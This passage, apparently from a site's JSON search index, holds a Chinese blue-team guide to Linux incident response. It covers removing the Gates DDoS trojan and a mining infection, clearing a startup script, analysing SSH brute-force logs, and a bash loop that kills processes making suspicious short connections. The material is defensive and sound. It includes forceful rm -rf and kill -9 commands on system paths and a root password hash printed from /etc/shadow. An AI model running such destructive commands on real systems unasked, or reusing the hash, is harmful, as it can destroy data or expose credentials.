\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5411\u670d\u52a1\u5668\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5199\u5165\u6076\u610f\u811a\u672c\u5e76\u6267\u884c\u3002 C\u3001\u6e05\u9664\u75c5\u6bd2 \u00b6 1\u3001\u5220\u9664\u5b9a\u65f6\u4efb\u52a1: 2\u3001\u7ec8\u6b62\u5f02\u5e38\u8fdb\u7a0b: D\u3001\u6f0f\u6d1e\u4fee\u590d \u00b6 \u5347\u7ea7struts\u5230\u6700\u65b0\u7248\u672c 0x03 \u9632\u8303\u63aa\u65bd \u00b6 \u9488\u5bf9\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u5b89\u5168\u8f6f\u4ef6\u5e76\u5347\u7ea7\u75c5\u6bd2\u5e93\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf\uff0c\u4fdd\u6301\u5b9e\u65f6\u9632\u62a4 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6 \u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c \u00b6 0x00 \u524d\u8a00 \u00b6 Linux\u76d6\u8328\u6728\u9a6c\u662f\u4e00\u7c7b\u6709\u7740\u4e30\u5bcc\u5386\u53f2\uff0c\u9690\u85cf\u624b\u6cd5\u5de7\u5999\uff0c\u7f51\u7edc\u653b\u51fb\u884c\u4e3a\u663e\u8457\u7684DDoS\u6728\u9a6c\uff0c\u4e3b\u8981\u6076\u610f\u7279\u70b9\u662f\u5177\u5907\u4e86\u540e\u95e8\u7a0b\u5e8f\uff0cDDoS\u653b\u51fb\u7684\u80fd\u529b\uff0c\u5e76\u4e14\u4f1a\u66ff\u6362\u5e38\u7528\u7684\u7cfb\u7edf\u6587\u4ef6\u8fdb\u884c\u4f2a\u88c5\u3002\u6728\u9a6c\u5f97\u540d\u4e8e\u5176\u5728\u53d8\u91cf\u51fd\u6570\u7684\u547d\u540d\u4e2d\uff0c\u5927\u91cf\u4f7f\u7528Gates\u8fd9\u4e2a\u5355\u8bcd\u3002\u5206\u6790\u548c\u6e05\u9664\u76d6\u8328\u6728\u9a6c\u7684\u8fc7\u7a0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u5f88\u591a\u503c\u5f97\u53bb\u5b66\u4e60\u548c\u501f\u9274\u7684\u5730\u65b9\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u53d1\u73b0\u670d\u52a1\u5668CPU\u8d44\u6e90\u5f02\u5e38\uff0c\u51e0\u4e2a\u5f02\u5e38\u8fdb\u7a0b\u5360\u7528\u5927\u91cf\u7f51\u7edc\u5e26\u5bbd\uff1a 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 \u5f02\u5e38IP\u8fde\u63a5\uff1a \u5f02\u5e38\u8fdb\u7a0b\uff1a \u67e5\u770b\u8fdb\u884c\u53d1\u73b0ps aux\u8fdb\u7a0b\u5f02\u5e38\uff0c\u8fdb\u5165\u8be5\u76ee\u5f55\u53d1\u73b0\u591a\u4e2a\u547d\u4ee4\uff0c\u731c\u6d4b\u547d\u4ee4\u53ef\u80fd\u5df2\u88ab\u66ff\u6362 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u5f02\u5e38\u542f\u52a8\u9879 \u8fdb\u5165rc3.d\u76ee\u5f55\u53ef\u4ee5\u53d1\u73b0\u591a\u4e2a\u5f02\u5e38\u8fdb\u884c\uff1a /etc/rc.d/rc3.d/S97DbSecuritySpt /etc/rc.d/rc3.d/S99selinux \u641c\u7d22\u75c5\u6bd2\u539f\u4f53 find / -size -1223124c -size +1223122c -exec ls -id {} \\; \u641c\u7d221223123\u5927\u5c0f\u7684\u6587\u4ef6 \u4ece\u4ee5\u4e0a\u79cd\u79cd\u884c\u4e3a\u53d1\u73b0\u8be5\u75c5\u6bd2\u4e0e\u201c\u76d6\u8328\u6728\u9a6c\u201d\u6709\u70b9\u7c7b\u4f3c\uff0c\u5177\u4f53\u6280\u672f\u5206\u6790\u7ec6\u8282\u8be6\u89c1\uff1a Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.freebuf.com/articles/system/117823.html \u60ac\u955c\u670d\u52a1\u5668\u536b\u58eb\u4e28Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.sohu.com/a/117926079_515168 \u624b\u52a8\u6e05\u9664\u6728\u9a6c\u8fc7\u7a0b\uff1a 1\u3001\u7b80\u5355\u5224\u65ad\u6709\u65e0\u6728\u9a6c #\u6709\u65e0\u4e0b\u5217\u6587\u4ef6 cat /etc/rc.d/init.d/selinux cat /etc/rc.d/init.d/DbSecuritySpt ls /usr/bin/bsd-port ls /usr/bin/dpkgd #\u67e5\u770b\u5927\u5c0f\u662f\u5426\u6b63\u5e38 ls -lh /bin/netstat ls -lh /bin/ps ls -lh /usr/sbin/lsof ls -lh /usr/sbin/ss 2\u3001\u4e0a\u4f20\u5982\u4e0b\u547d\u4ee4\u5230/root\u4e0b ps netstat ss lsof 3\u3001\u5220\u9664\u5982\u4e0b\u76ee\u5f55\u53ca\u6587\u4ef6 rm -rf /usr/bin/dpkgd (ps netstat lsof ss) rm -rf /usr/bin/bsd-port #\u6728\u9a6c\u7a0b\u5e8f rm -f /usr/bin/.sshd #\u6728\u9a6c\u540e\u95e8 rm -f /tmp/gates.lod rm -f /tmp/moni.lod rm -f /etc/rc.d/init.d/DbSecuritySpt(\u542f\u52a8\u4e0a\u8ff0\u63cf\u8ff0\u7684\u90a3\u4e9b\u6728\u9a6c\u53d8\u79cd\u7a0b\u5e8f) rm -f /etc/rc.d/rc1.d/S97DbSecuritySpt rm -f /etc/rc.d/rc2.d/S97DbSecuritySpt rm -f /etc/rc.d/rc3.d/S97DbSecuritySpt rm -f /etc/rc.d/rc4.d/S97DbSecuritySpt rm -f /etc/rc.d/rc5.d/S97DbSecuritySpt rm -f /etc/rc.d/init.d/selinux(\u9ed8\u8ba4\u662f\u542f\u52a8/usr/bin/bsd-port/getty) rm -f /etc/rc.d/rc1.d/S99selinux rm -f /etc/rc.d/rc2.d/S99selinux rm -f /etc/rc.d/rc3.d/S99selinux rm -f /etc/rc.d/rc4.d/S99selinux rm -f /etc/rc.d/rc5.d/S99selinux 4\u3001\u627e\u51fa\u5f02\u5e38\u7a0b\u5e8f\u5e76\u6740\u6b7b 5\u3001\u5220\u9664\u542b\u6728\u9a6c\u547d\u4ee4\u5e76\u91cd\u65b0\u5b89\u88c5 0x03 \u547d\u4ee4\u66ff\u6362 \u00b6 RPM check\u68c0\u67e5\uff1a \u7cfb\u7edf\u5b8c\u6574\u6027\u4e5f\u53ef\u4ee5\u901a\u8fc7rpm\u81ea\u5e26\u7684-Va\u6765\u6821\u9a8c\u68c0\u67e5\u6240\u6709\u7684rpm\u8f6f\u4ef6\u5305,\u6709\u54ea\u4e9b\u88ab\u7be1\u6539\u4e86,\u9632\u6b62rpm\u4e5f\u88ab\u66ff\u6362,\u4e0a\u4f20\u4e00\u4e2a\u5b89\u5168\u5e72\u51c0\u7a33\u5b9a\u7248\u672crpm\u4e8c\u8fdb\u5236\u5230\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u68c0\u67e5 ./rpm -Va > rpm.log \u5982\u679c\u4e00\u5207\u5747\u6821\u9a8c\u6b63\u5e38\u5c06\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa\u3002\u5982\u679c\u6709\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u663e\u793a\u51fa\u6765\u3002\u8f93\u51fa\u683c\u5f0f\u662f8\u4f4d\u957f\u5b57\u7b26\u4e32, ``c \u7528\u4ee5\u6307\u914d\u7f6e\u6587\u4ef6, \u63a5\u7740\u662f\u6587\u4ef6\u540d. 8\u4f4d\u5b57\u7b26\u7684\u6bcf\u4e00\u4e2a \u7528\u4ee5\u8868\u793a\u6587\u4ef6\u4e0eRPM\u6570\u636e\u5e93\u4e2d\u4e00\u79cd\u5c5e\u6027\u7684\u6bd4\u8f83\u7ed3\u679c \u3002``. (\u70b9) \u8868\u793a\u6d4b\u8bd5\u901a\u8fc7\u3002.\u4e0b\u9762\u7684\u5b57\u7b26\u8868\u793a\u5bf9RPM\u8f6f\u4ef6\u5305\u8fdb\u884c\u7684\u67d0\u79cd\u6d4b\u8bd5\u5931\u8d25\uff1a \u547d\u4ee4\u66ff\u6362\uff1a rpm2cpio \u5305\u5168\u540d | cpio -idv .\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84 rpm\u5305\u4e2d\u6587\u4ef6\u63d0\u53d6 Rpm2cpio \u5c06rpm\u5305\u8f6c\u6362\u4e3acpio\u683c\u5f0f\u7684\u547d\u4ee4 Cpio \u662f\u4e00\u4e2a\u6807\u51c6\u5de5\u5177\uff0c\u5b83\u7528\u4e8e\u521b\u5efa\u8f6f\u4ef6\u6863\u6848\u6587\u4ef6\u548c\u4ece\u6863\u6848\u6587\u4ef6\u4e2d\u63d0\u53d6\u6587\u4ef6 Cpio \u9009\u9879 < [\u6587\u4ef6|\u8bbe\u5907] -i\uff1acopy-in\u6a21\u5f0f\uff0c\u8fd8\u539f -d\uff1a\u8fd8\u539f\u65f6\u81ea\u52a8\u65b0\u5efa\u76ee\u5f55 -v\uff1a\u663e\u793a\u8fd8\u539f\u8fc7\u7a0b \u6587\u4ef6\u63d0\u53d6\u8fd8\u539f\u6848\u4f8b\uff1a rpm -qf /bin/ls \u67e5\u8be2ls\u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 mv /bin/ls /tmp rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls \u63d0\u53d6rpm\u5305\u4e2dls\u547d\u4ee4\u5230\u5f53\u524d\u76ee\u5f55\u7684/bin/ls\u4e0b cp /root/bin/ls /bin/ \u628als\u547d\u4ee4\u590d\u5236\u5230/bin/\u76ee\u5f55 \u4fee\u590d\u6587\u4ef6\u4e22\u5931 \u6302\u8f7d\u547d\u4ee4rpm\u5305\uff1a mkdir /mnt/chrom/ \u5efa\u7acb\u6302\u8f7d\u70b9 mount -t iso9660 /dev/cdrom /mnt/cdrom/ \u6302\u5728\u5149\u76d8 mount/dev/sr0 /mnt/cdrom/ \u5378\u8f7d\u547d\u4ee4 umount \u8bbe\u5907\u6587\u4ef6\u540d\u6216\u6302\u8f7d\u70b9 umount /mnt/cdrom/ \u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2 \u00b6 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u67d0\u670d\u52a1\u5668\u7f51\u7edc\u8d44\u6e90\u5f02\u5e38,\u611f\u67d3\u8be5\u6728\u9a6c\u75c5\u6bd2\u7684\u670d\u52a1\u5668\u4f1a\u5360\u7528\u7f51\u7edc\u5e26\u5bbd\uff0c\u751a\u81f3\u5f71\u54cd\u7f51\u7edc\u4e1a\u52a1\u6b63\u5e38\u5e94\u7528\u3002 \u7cfb\u7edf\u5206\u6790 \u00b6 \u9488\u5bf9\u65e5\u5fd7\u670d\u52a1\u5668\u75c5\u6bd2\u4e8b\u4ef6\u6392\u67e5\u60c5\u51b5\uff1a \u5728\u5f00\u673a\u542f\u52a8\u9879/etc/rc.d/rc.local\u53d1\u73b0\u53ef\u7591\u7684sh.sh\u811a\u672c\uff0c\u8fdb\u4e00\u6b65\u8ddf\u8e2ash.sh\u811a\u672c,\u8fd9\u662f\u4e00\u4e2a\u68c0\u6d4b\u75c5\u6bd2\u5341\u5206\u949f\u5b58\u6d3b\u7684\u811a\u672c\u3002 \u5728root\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u6d3b\u68c0\u6d4b\u811a\u672c \u89e3\u51b3\u6b65\u9aa4\uff1a \u7ed3\u675f\u8fdb\u7a0b ps aux | grep \"conf.m\" | grep -v grep | awk \u2018{print $2}\u2018| xargs kill -9 \u6e05\u9664\u81ea\u52a8\u542f\u52a8\u811a\u672c vim /etc/rc.local \u53bb\u6389 sh /etc/chongfu.sh & \u6e05\u9664 \u811a\u672c rm -rf /etc/chongfu.sh /tem/chongfu.sh \u4fee\u6539\u767b\u5f55\u5bc6\u7801 passwd \u91cd\u542f\u3002 reboot","title":"Linux\u5b9e\u6218"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#1ssh","text":"","title":"\u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x00","text":"SSH \u662f\u76ee\u524d\u8f83\u53ef\u9760\uff0c\u4e13\u4e3a\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u548c\u5176\u4ed6\u7f51\u7edc\u670d\u52a1\u63d0\u4f9b\u5b89\u5168\u6027\u7684\u534f\u8bae\uff0c\u4e3b\u8981\u7528\u4e8e\u7ed9\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u6570\u636e\u8fdb\u884c\u52a0\u5bc6\uff0c\u4fdd\u8bc1\u6570\u636e\u4f20\u8f93\u7684\u5b89\u5168\u3002SSH\u53e3\u4ee4\u957f\u5ea6\u592a\u77ed\u6216\u8005\u590d\u6742\u5ea6\u4e0d\u591f\uff0c\u5982\u4ec5\u5305\u542b\u6570\u5b57\uff0c\u6216\u4ec5\u5305\u542b\u5b57\u6bcd\u7b49\uff0c\u5bb9\u6613\u88ab\u653b\u51fb\u8005\u7834\u89e3\uff0c\u4e00\u65e6\u88ab\u653b\u51fb\u8005\u83b7\u53d6\uff0c\u53ef\u7528\u6765\u76f4\u63a5\u767b\u5f55\u7cfb\u7edf\uff0c\u63a7\u5236\u670d\u52a1\u5668\u6240\u6709\u6743\u9650\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x01","text":"\u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u767b\u5f55\u670d\u52a1\u5668\u8fdb\u884c\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u7aef\u53e3\u8fde\u63a5\u91cc\u5b58\u5728\u4e24\u6761\u53ef\u7591\u7684\u8fde\u63a5\u8bb0\u5f55\uff0c\u5982\u4e0b\u56fe\uff1a TCP\u521d\u59cb\u5316\u8fde\u63a5\u4e09\u6b21\u63e1\u624b\u5427\uff1a\u53d1SYN\u5305\uff0c\u7136\u540e\u8fd4\u56deSYN/ACK\u5305\uff0c\u518d\u53d1ACK\u5305\uff0c\u8fde\u63a5\u6b63\u5f0f\u5efa\u7acb\u3002\u4f46\u662f\u8fd9\u91cc\u6709\u70b9\u51fa\u5165\uff0c\u5f53\u8bf7\u6c42\u8005\u6536\u5230SYS/ACK\u5305\u540e\uff0c\u5c31\u5f00\u59cb\u5efa\u7acb\u8fde\u63a5\u4e86\uff0c\u800c\u88ab\u8bf7\u6c42\u8005\u7b2c\u4e09\u6b21\u63e1\u624b\u7ed3\u675f\u540e\u624d\u5efa\u7acb\u8fde\u63a5\u3002 \u5ba2\u6237\u7aefTCP\u72b6\u6001\u8fc1\u79fb\uff1a CLOSED->SYN_SENT->ESTABLISHED->FIN_WAIT_1->FIN_WAIT_2->TIME_WAIT->CLOSED \u670d\u52a1\u5668TCP\u72b6\u6001\u8fc1\u79fb\uff1a 1 CLOSED->LISTEN->SYN recv->ESTABLISHED->CLOSE_WAIT->LAST_ACK->CLOSED \u5f53\u5ba2\u6237\u7aef\u5f00\u59cb\u8fde\u63a5\u65f6\uff0c\u670d\u52a1\u5668\u8fd8\u5904\u4e8eLISTENING\uff0c\u5ba2\u6237\u7aef\u53d1\u4e00\u4e2aSYN\u5305\u540e\uff0c\u670d\u52a1\u7aef\u63a5\u6536\u5230\u4e86\u5ba2\u6237\u7aef\u7684SYN\u5e76\u4e14\u53d1\u9001\u4e86ACK\u65f6\uff0c\u670d\u52a1\u5668\u5904\u4e8eSYN_RECV\u72b6\u6001\uff0c\u7136\u540e\u5e76\u6ca1\u6709\u518d\u6b21\u6536\u5230\u5ba2\u6237\u7aef\u7684ACK\u8fdb\u5165ESTABLISHED\u72b6\u6001\uff0c\u4e00\u76f4\u505c\u7559\u5728SYN_RECV\u72b6\u6001\u3002 \u5728\u8fd9\u91cc\uff0cSSH\uff0822\uff09\u7aef\u53e3\uff0c\u4e24\u6761\u5916\u7f51IP\u7684SYN_RECV\u72b6\u6001\u8fde\u63a5\uff0c\u76f4\u89c9\u544a\u8bc9\u4e86\u7ba1\u7406\u5458\uff0c\u8fd9\u91cc\u4e00\u5b9a\u6709\u4ec0\u4e48\u5f02\u5e38\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x02","text":"SSH\u7aef\u53e3\u5f02\u5e38\uff0c\u6211\u4eec\u9996\u5148\u6709\u5fc5\u8981\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5\uff1a A\u3001\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5 1\u3001\u9664root\u4e4b\u5916\uff0c\u662f\u5426\u8fd8\u6709\u5176\u5b83\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd root 2\u3001\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow root:$6$38cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7::: \u6211\u4eec\u53ef\u4ee5\u786e\u8ba4\u76ee\u524d\u7cfb\u7edf\u53ea\u6709\u4e00\u4e2a\u7ba1\u7406\u7528\u6237root\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u60f3\u5230\u7684\u662f/var/log/secure\uff0c\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u8bb0\u5f55\u4e86\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\u4e0b\u6765\u3002 B\u3001\u786e\u8ba4\u653b\u51fb\u60c5\u51b5\uff1a 1\u3001\u7edf\u8ba1\u4e86\u4e0b\u65e5\u5fd7\uff0c\u53d1\u73b0\u5927\u7ea6\u6709126254\u6b21\u767b\u5f55\u5931\u8d25\u7684\u8bb0\u5f55\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u906d\u53d7\u66b4\u529b\u7834\u89e3 [root@localhost ~]# grep -o \"Failed password\" /var/log/secure|uniq -c 126254 Failed password 2\u3001\u8f93\u51fa\u767b\u5f55\u7206\u7834\u7684\u7b2c\u4e00\u884c\u548c\u6700\u540e\u4e00\u884c\uff0c\u786e\u8ba4\u7206\u7834\u65f6\u95f4\u8303\u56f4\uff1a [root@localhost ~]# grep \"Failed password\" /var/log/secure|head -1 Jul 8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2 [root@localhost ~]# grep \"Failed password\" /var/log/secure|tail -1 Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2 3\u3001\u8fdb\u4e00\u6b65\u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c | sort -nr 12622 23.91.xxx.xxx 8942 114.104.xxx.xxx 8122 111.13.xxx.xxx 7525 123.59.xxx.xxx ................... 4\u3001\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u90fd\u6709\u54ea\u4e9b\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 9402 root 3265 invalid user oracle 1245 invalid user admin 1025 invalid user user ..................... C\u3001\u7ba1\u7406\u5458\u6700\u8fd1\u767b\u5f55\u60c5\u51b5\uff1a 1\u3001\u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' Jul 9 09:38:09 root 192.168.143.100 Jul 9 14:55:51 root 192.168.143.100 Jul 10 08:54:26 root 192.168.143.100 Jul 10 16:25:59 root 192.168.143.100 ............................ \u901a\u8fc7\u767b\u5f55\u65e5\u5fd7\u5206\u6790\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u65f6\u95f4\u548c\u767b\u5f55IP\u3002 2\u3001\u987a\u4fbf\u7edf\u8ba1\u4e00\u4e0b\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 27 192.168.204.1 \u901a\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u7528\u6237\u540d\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u4f46\u4ece\u8fd1\u6bb5\u65f6\u95f4\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u767b\u5f55\u8bb0\u5f55\u6765\u770b\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u7684\u60c5\u51b5\uff0c\u9700\u8981\u8fdb\u4e00\u6b65\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u5165\u4fb5\u6392\u67e5\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u9610\u8ff0\u3002","title":"0x02 \u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x04","text":"SSH\u66b4\u529b\u7834\u89e3\u4f9d\u7136\u5341\u5206\u666e\u904d\uff0c\u5982\u4f55\u4fdd\u62a4\u670d\u52a1\u5668\u4e0d\u53d7\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u63aa\u65bd\uff1a 1\u3001\u7981\u6b62\u5411\u516c\u7f51\u5f00\u653e\u7ba1\u7406\u7aef\u53e3\uff0c\u82e5\u5fc5\u987b\u5f00\u653e\u5e94\u9650\u5b9a\u7ba1\u7406IP\u5730\u5740\u5e76\u52a0\u5f3a\u53e3\u4ee4\u5b89\u5168\u5ba1\u8ba1\uff08\u53e3\u4ee4\u957f\u5ea6\u4e0d\u4f4e\u4e8e8\u4f4d\uff0c\u7531\u6570\u5b57\u3001\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7b49\u81f3\u5c11\u4e24\u79cd\u4ee5\u4e0a\u7ec4\u5408\u6784\u6210\uff09\u3002 2\u3001\u66f4\u6539\u670d\u52a1\u5668ssh\u9ed8\u8ba4\u7aef\u53e3\u3002 3\u3001\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\uff0c\u589e\u5f3a\u5b89\u5168\u9632\u62a4\u3002","title":"0x04 \u5904\u7406\u63aa\u65bd"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#2","text":"","title":"\u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x00_1","text":"\u77ed\u8fde\u63a5\uff08short connnection\uff09\u662f\u76f8\u5bf9\u4e8e\u957f\u8fde\u63a5\u800c\u8a00\u7684\u6982\u5ff5\uff0c\u6307\u7684\u662f\u5728\u6570\u636e\u4f20\u9001\u8fc7\u7a0b\u4e2d\uff0c\u53ea\u5728\u9700\u8981\u53d1\u9001\u6570\u636e\u65f6\uff0c\u624d\u53bb\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5\uff0c\u6570\u636e\u53d1\u9001\u5b8c\u6210\u540e\uff0c\u5219\u65ad\u5f00\u6b64\u8fde\u63a5\uff0c\u5373\u6bcf\u6b21\u8fde\u63a5\u53ea\u5b8c\u6210\u4e00\u9879\u4e1a\u52a1\u7684\u53d1\u9001\u3002 \u5728\u7cfb\u7edf\u7ef4\u62a4\u4e2d\uff0c\u4e00\u822c\u5f88\u96be\u53bb\u5bdf\u89c9\uff0c\u9700\u8981\u501f\u52a9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u6216\u8005\u6293\u5305\u5206\u6790\uff0c\u624d\u80fd\u591f\u53bb\u53d1\u73b0\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x01_1","text":"\u67d0\u5929\uff0c\u7f51\u7edc\u7ba1\u7406\u5458\u5728\u51fa\u53e3WAF\u68c0\u6d4b\u5230\u67d0\u53f0\u670d\u52a1\u5668\u4e0d\u65ad\u5411\u9999\u6e2fI\u53d1\u8d77\u8bf7\u6c42 \uff0c\u611f\u89c9\u5f88\u5947\u602a\uff0c\u767b\u5f55\u670d\u52a1\u5668\u6392\u67e5\uff0c\u60f3\u8981\u627e\u5230\u53d1\u8d77\u77ed\u8fde\u63a5\u7684\u8fdb\u7a0b\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x02_1","text":"\u767b\u5f55\u670d\u52a1\u5668\u67e5\u770b\u7aef\u53e3\u3001\u8fdb\u7a0b\uff0c\u5e76\u672a\u53d1\u73b0\u53d1\u73b0\u670d\u52a1\u5668\u5f02\u5e38\uff0c\u4f46\u662f\u5f53\u591a\u6b21\u5237\u65b0\u7aef\u53e3\u8fde\u63a5\u65f6\uff0c\u53ef\u4ee5\u67e5\u770b\u8be5\u8fde\u63a5\u3002 \u6709\u65f6\u5019\u4e00\u76f4\u5237\u8fd9\u6761\u547d\u4ee4\u597d\u5341\u51e0\u6b21\u624d\u4f1a\u51fa\u73b0\uff0c\u50cf\u8fd9\u79cd\u7684\u77ed\u8fde\u63a5\u6781\u96be\u6355\u6349\u5230\u5bf9\u5e94\u7684\u8fdb\u7a0b\u548c\u6e90\u6587\u4ef6\u3002 \u624b\u52a8\u6355\u6349\u4f30\u8ba1\u6ca1\u620f\uff0c\u5f88\u96be\u8ffd\u8e2a\uff0c\u4e8e\u662f\u52a8\u624b\u5199\u4e86\u4e00\u6bb5\u5c0f\u811a\u672c\u6765\u6355\u6349\u77ed\u8fde\u63a5\u5bf9\u5e94\u7684pid\u548c\u6e90\u6587\u4ef6\u3002 \u811a\u672c\u6587\u4ef6\u5982\u4e0b\uff1a #!/bin/bash ip=118.184.15.40 i=1 while : do tmp=netstat -anplt|grep $ip|awk -F '[/]' '{print $1}'|awk '{print $7}' #echo $tmp if test -z \"$tmp\" then ((i=i+1)) else for pid in $tmp; do echo \"PID: \"${pid} result=ls -lh /proc/$pid|grep exe echo \"Process: \"${result} kill -9 $pid done break fi done echo \"Total number of times: \"${i} \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u8dd1\u4e86\u4e09\u6b21\u811a\u672c\uff0c\u53ef\u4ee5\u53d1\u73b0\u77ed\u8fde\u63a5\u6bcf\u6b21\u53d1\u8d77\u7684\u8fdb\u7a0bPid\u4e00\u76f4\u5728\u53d8\uff0c\u4f46\u5df2\u7ecf\u6355\u6349\u5230\u53d1\u8d77\u8be5\u5f02\u5e38\u8fde\u63a5\u7684\u8fdb\u7a0b\u6e90\u6587\u4ef6\u4e3a /usr/lib/nfsiod","title":"0x02 